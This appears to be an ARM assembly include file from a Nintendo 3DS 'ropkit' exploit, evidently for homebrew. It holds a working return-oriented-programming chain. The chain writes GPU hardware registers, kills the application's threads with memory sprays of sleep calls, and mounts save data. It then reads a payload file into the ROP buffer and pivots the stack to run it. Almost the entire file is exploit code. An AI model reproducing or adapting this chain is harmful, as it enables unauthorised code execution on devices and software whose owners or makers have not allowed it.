#pragma once

@ This is intended to be included by a regular-application exploit .s.

#ifndef ROPKIT_TMPDATA
	#define ROPKIT_TMPDATA 0x0FFF0000
#endif

#define ropkit_IFile_ctx (ROPKIT_TMPDATA+4)

#define ROPKIT_ROPBAK (ROPKIT_TMPDATA+0x100)

#ifndef ROPKIT_BINLOAD_SIZE
	#define ROPKIT_BINLOAD_SIZE 0xC000
#endif

#define ROPKIT_LINEARMEM_WORKBUF (ROPKIT_LINEARMEM_BUF+ROPKIT_BINLOAD_SIZE)

#ifndef ROPKIT_BINLOAD_ADDR
	#define ROPKIT_BINLOAD_ADDR ROPBUF+0x400
#endif

#ifndef ROPKIT_BINLOAD_TEXTOFFSET
	#define ROPKIT_BINLOAD_TEXTOFFSET 0x1000
#endif

#ifndef ROPKIT_BINPAYLOAD_PATH
	#define ROPKIT_BINPAYLOAD_PATH "data:/payload.bin"
#endif

#ifndef ROPKIT_OTHERAPP_NEWSP_ADDR
	#define ROPKIT_OTHERAPP_NEWSP_ADDR (0x10000000-4)
#endif

#define ROPKIT_TRANSFER_CHUNKSIZE 0x100000
ROP_SETR0 0x010000ff
ROP_SETR1 ROPKIT_TMPDATA+0x80
.word STR_R0R1_POPR4PC
.word GARBAGE

@ Copy red to address and then gpu_writehwregs. we need to stay position independant
CALLFUNC_NOSP GSP_WRITEHWREGS, GSPGPU_SERVHANDLEADR, HWREGS_ADDR, ROPKIT_TMPDATA+0x80, 4
CALLFUNC_R0R1 svcSleepThread, 1000*1000000, 0

@ Set the flag for terminating the GSP thread.
@CALLFUNC_R0R1 svcSleepThread, 0x80000000,0
ROPMACRO_WRITEWORD GSPTHREAD_OBJECTADDR+0x77, 0x1

@ Lets kill these two threads before they crash the whole app!

@This is the main thread, just spam the current SP range with svcSleepThread. Sloppy and lazy but works OK, but sleepThread could expire in 5 minutes or 50 years based on unknown r1 value. Ill confirm this later, but time seems sufficiant for now.
CALLFUNC_NOSP MEMSET32_OTHER+4, 0x0ffff800, 0x7f0, svcSleepThread, 0 
@These memsets sprays are for the 2nd thread to kill. Its a sub-thread, but no less dangerous!
CALLFUNC_NOSP MEMSET32_OTHER+4, 0x148d5b88-0x200, 0x210, 0x148d5b88, 0
CALLFUNC_NOSP MEMSET32_OTHER+4, 0x148d5b88+0x10, 0x100, svcSleepThread, 0

CALLFUNC_NOSP FS_MountExtSavedata, UBL_, 0, 0x308, 0

@ Load the file into the buffer.

CALLFUNC_NOSP IFile_Open, ropkit_IFile_ctx, UBL_UBLL_LST, 1, 0


CALLFUNC_NOSP IFile_Read, ropkit_IFile_ctx, ROPKIT_TMPDATA, ROPBUF, 0x5000
CALLFUNC_R0R1 svcSleepThread, 100000000,0

.word POP_R0PC
.word ROPBUF
.word POP_R1PC
.word ROP_POPPC
.word STACK_PIVOT2